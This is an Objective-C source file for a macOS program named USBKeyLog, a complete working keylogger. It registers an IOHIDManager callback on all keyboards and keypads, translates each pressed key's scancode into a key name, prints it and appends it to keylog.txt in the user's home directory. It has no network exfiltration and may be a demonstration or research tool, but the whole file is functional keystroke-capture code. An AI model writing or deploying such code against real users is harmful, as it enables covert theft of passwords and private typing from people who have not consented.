//
//  main.m
//  USBKeyLog
//
//  Created by csaby on 2019. 02. 16..
//
// taken from https://stackoverflow.com/questions/30380400/how-to-tap-hook-keyboard-events-in-osx-and-record-which-keyboard-fires-each-even

//keyboard map from: https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX10.6.sdk/System/Library/Frameworks/IOKit.framework/Versions/A/Headers/hid/IOHIDUsageTables.h

#import <Foundation/Foundation.h>
#include <IOKit/hid/IOHIDValue.h>
#include <IOKit/hid/IOHIDManager.h>

const char* keyboard_map(int scancode)
{
    //char * letter;
    switch (scancode) {
        case 0x04: return "a or A";
        case 0x05: return "b or B";
        case 0x06: return "c or C";
        case 0x07: return "d or D";
        case 0x08: return "e or E";
        case 0x09: return "f or F";
        case 0x0A: return "g or G";
        case 0x0B: return "h or H";
        case 0x0C: return "i or I";
        case 0x0D: return "j or J";
        case 0x0E: return "k or K";
        case 0x0F: return "l or L";
        case 0x10: return "m or M";
        case 0x11: return "n or N";
        case 0x12: return "o or O";
        case 0x13: return "p or P";
        case 0x14: return "q or Q";
        case 0x15: return "r or R";
        case 0x16: return "s or S";
        case 0x17: return "t or T";
        case 0x18: return "u or U";
        case 0x19: return "v or V";
        case 0x1A: return "w or W";
        case 0x1B: return "x or X";
        case 0x1C: return "y or Y";
        case 0x1D: return "z or Z";
        case 0x1E: return "1 or !";
        case 0x1F: return "2 or @";
        case 0x20: return "3 or #";
        case 0x21: return "4 or $";
        case 0x22: return "5 or %";
        case 0x23: return "6 or ^";
        case 0x24: return "7 or &";
        case 0x25: return "8 or *";
        case 0x26: return "9 or (";
        case 0x27: return "0 or )";
        case 0x28: return "Return (Enter)";
        case 0x29: return "Escape";
        case 0x2A: return "Delete (Backspace)";
        case 0x2B: return "Tab";
        case 0x2C: return "Spacebar";
        case 0x2D: return "- or _";
        case 0x2E: return "";
        case 0x2F: return "[ or {";
        case 0x30: return "] or }";
        case 0x31: return "\\ or |";
        case 0x32: return "Non-US # or _";
        case 0x33: return "; or :";
        case 0x34: return "' or \"";
        case 0x35: return "Grave Accent and Tilde";
        case 0x36: return ", or <";
        case 0x37: return ". or >";
        case 0x38: return "/ or ?";
        case 0x39: return "Caps Lock";
        case 0x3A: return "F1";
        case 0x3B: return "F2";
        case 0x3C: return "F3";
        case 0x3D: return "F4";
        case 0x3E: return "F5";
        case 0x3F: return "F6";
        case 0x40: return "F7";
        case 0x41: return "F8";
        case 0x42: return "F9";
        case 0x43: return "F10";
        case 0x44: return "F11";
        case 0x45: return "F12";
        case 0x46: return "Print Screen";
        case 0x47: return "Scroll Lock";
        case 0x48: return "Pause";
        case 0x49: return "Insert";
        case 0x4A: return "Home";
        case 0x4B: return "Page Up";
        case 0x4C: return "Delete Forward";
        case 0x4D: return "End";
        case 0x4E: return "Page Down";
        case 0x4F: return "Right Arrow";
        case 0x50: return "Left Arrow";
        case 0x51: return "Down Arrow";
        case 0x52: return "Up Arrow";
        case 0x53: return "Keypad NumLock or Clear";
        case 0x54: return "Keypad /";
        case 0x55: return "Keypad *";
        case 0x56: return "Keypad -";
        case 0x57: return "Keypad +";
        case 0x58: return "Keypad Enter";
        case 0x59: return "Keypad 1 or End";
        case 0x5A: return "Keypad 2 or Down Arrow";
        case 0x5B: return "Keypad 3 or Page Down";
        case 0x5C: return "Keypad 4 or Left Arrow";
        case 0x5D: return "Keypad 5";
        case 0x5E: return "Keypad 6 or Right Arrow";
        case 0x5F: return "Keypad 7 or Home";
        case 0x60: return "Keypad 8 or Up Arrow";
        case 0x61: return "Keypad 9 or Page Up";
        case 0x62: return "Keypad 0 or Insert";
        case 0x63: return "Keypad . or Delete";
        case 0x64: return "Non-US \\ or |";
        case 0x65: return "Application";
        case 0x66: return "Power";
        case 0x67: return "Keypad";
        case 0x68: return "F13";
        case 0x69: return "F14";
        case 0x6A: return "F15";
        case 0x6B: return "F16";
        case 0x6C: return "F17";
        case 0x6D: return "F18";
        case 0x6E: return "F19";
        case 0x6F: return "F20";
        case 0x70: return "F21";
        case 0x71: return "F22";
        case 0x72: return "F23";
        case 0x73: return "F24";
        case 0x74: return "Execute";
        case 0x75: return "Help";
        case 0x76: return "Menu";
        case 0x77: return "Select";
        case 0x78: return "Stop";
        case 0x79: return "Again";
        case 0x7A: return "Undo";
        case 0x7B: return "Cut";
        case 0x7C: return "Copy";
        case 0x7D: return "Paste";
        case 0x7E: return "Find";
        case 0x7F: return "Mute";
        case 0x80: return "Volume Up";
        case 0x81: return "Volume Down";
        case 0x82: return "Locking Caps Lock";
        case 0x83: return "Locking Num Lock";
        case 0x84: return "Locking Scroll Lock";
        case 0x85: return "Keypad Comma";
        case 0x86: return "Keypad Equal Sign for AS/400";
        case 0x87: return "International1";
        case 0x88: return "International2";
        case 0x89: return "International3";
        case 0x8A: return "International4";
        case 0x8B: return "International5";
        case 0x8C: return "International6";
        case 0x8D: return "International7";
        case 0x8E: return "International8";
        case 0x8F: return "International9";
        case 0x90: return "LANG1";
        case 0x91: return "LANG2";
        case 0x92: return "LANG3";
        case 0x93: return "LANG4";
        case 0x94: return "LANG5";
        case 0x95: return "LANG6";
        case 0x96: return "LANG7";
        case 0x97: return "LANG8";
        case 0x98: return "LANG9";
        case 0x99: return "AlternateErase";
        case 0x9A: return "SysReq/Attention";
        case 0x9B: return "Cancel";
        case 0x9C: return "Clear";
        case 0x9D: return "Prior";
        case 0x9E: return "Return";
        case 0x9F: return "Separator";
        case 0xA0: return "Out";
        case 0xA1: return "Oper";
        case 0xA2: return "Clear/Again";
        case 0xA3: return "CrSel/Props";
        case 0xA4: return "ExSel";
        case 0xE0: return "Left Control";
        case 0xE1: return "Left Shift";
        case 0xE2: return "Left Alt";
        case 0xE3: return "Left GUI";
        case 0xE4: return "Right Control";
        case 0xE5: return "Right Shift";
        case 0xE6: return "Right Alt";
        case 0xE7: return "Right GUI";

        default:
            return "";
    }
    return "";
}

void write_to_file(const char * t)
{
    FILE *f;
    char *homeDir = getenv("HOME");
    char* filename = "/keylog.txt";
    char* fullpath;
    
    fullpath = malloc(strlen(homeDir)+strlen(filename)+1);
    strcpy(fullpath, homeDir);
    strcat(fullpath, filename);
    f = fopen(fullpath, "a");
    fprintf(f,"%s\n", t);
    fclose(f);

}

void myHIDKeyboardCallback( void* context,  IOReturn result,  void* sender,  IOHIDValueRef value )
{
    IOHIDElementRef elem = IOHIDValueGetElement(value);
    if (IOHIDElementGetUsagePage(elem) != 0x07)
        return;
    
    IOHIDDeviceRef device = sender;
    
    //get keyborad product id
    int32_t pid = 1;
    CFNumberGetValue(IOHIDDeviceGetProperty(device, CFSTR(kIOHIDProductIDKey)), kCFNumberSInt32Type, &pid);
    
    uint32_t scancode = IOHIDElementGetUsage(elem);
    
    if (scancode < 4 || scancode > 231)
        return;
    
    long pressed = IOHIDValueGetIntegerValue(value);
    
    //printf("scancode: %d, pressed: %ld, keyboardId=%d\n", scancode, pressed, pid);
    
    if (pressed == 1)
    {
        printf("%s\n", keyboard_map(scancode));
        write_to_file(keyboard_map(scancode));
        
    }
}


CFMutableDictionaryRef myCreateDeviceMatchingDictionary( UInt32 usagePage,  UInt32 usage )
{
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(
                                                            kCFAllocatorDefault, 0
                                                            , & kCFTypeDictionaryKeyCallBacks
                                                            , & kCFTypeDictionaryValueCallBacks );
    if ( ! dict )
        return NULL;
    
    CFNumberRef pageNumberRef = CFNumberCreate( kCFAllocatorDefault, kCFNumberIntType, & usagePage );
    if ( ! pageNumberRef ) {
        CFRelease( dict );
        return NULL;
    }
    
    CFDictionarySetValue( dict, CFSTR(kIOHIDDeviceUsagePageKey), pageNumberRef );
    CFRelease( pageNumberRef );
    
    CFNumberRef usageNumberRef = CFNumberCreate( kCFAllocatorDefault, kCFNumberIntType, & usage );
    
    if ( ! usageNumberRef ) {
        CFRelease( dict );
        return NULL;
    }
    
    CFDictionarySetValue( dict, CFSTR(kIOHIDDeviceUsageKey), usageNumberRef );
    CFRelease( usageNumberRef );
    
    return dict;
}


int main(void)
{
    IOHIDManagerRef hidManager = IOHIDManagerCreate( kCFAllocatorDefault, kIOHIDOptionsTypeNone );
    
    CFArrayRef matches;
    {
        CFMutableDictionaryRef keyboard = myCreateDeviceMatchingDictionary( kHIDPage_GenericDesktop, kHIDUsage_GD_Keyboard ); //usage page: 0x01, usage: 0x06
        CFMutableDictionaryRef keypad   = myCreateDeviceMatchingDictionary( kHIDPage_GenericDesktop, kHIDUsage_GD_Keypad ); //usage page: 0x01, usage: 0x07

        CFMutableDictionaryRef matchesList[] = { keyboard, keypad };
        
        matches = CFArrayCreate( kCFAllocatorDefault, (const void **)matchesList, 2, NULL );

        //todo:
        //need to add kHIDPage_KeyboardOrKeypad    = 0x07
    }
    
    IOHIDManagerSetDeviceMatchingMultiple( hidManager, matches );
    
    IOHIDManagerRegisterInputValueCallback( hidManager, myHIDKeyboardCallback, NULL );
    
    IOHIDManagerScheduleWithRunLoop( hidManager, CFRunLoopGetMain(), kCFRunLoopDefaultMode );
    
    IOHIDManagerOpen( hidManager, kIOHIDOptionsTypeNone );
    
    CFRunLoopRun(); // spin
}
